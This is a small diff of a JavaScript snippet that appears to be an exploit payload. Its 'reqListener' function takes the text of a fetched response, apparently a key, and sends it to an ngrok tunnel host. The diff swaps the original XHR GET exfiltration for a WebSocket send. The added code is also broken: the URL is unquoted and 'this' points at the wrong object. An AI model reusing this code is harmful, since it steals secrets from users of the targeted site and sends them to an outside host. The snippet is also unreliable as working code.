@@ -9,9 +9,10 @@ req.send();
 
 function reqListener() {
     try {
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", "//0.tcp.ap.ngrok.io:11134/log?key=" + this.responseText, true);
-        xhr.send();
+        var socket = new WebSocket(wss://0.tcp.ap.ngrok.io:11134);
+        socket.onopen = function(event) {
+        socket.send(this.responseText);
+};
     } catch (e) {
         console.error(e);
     }
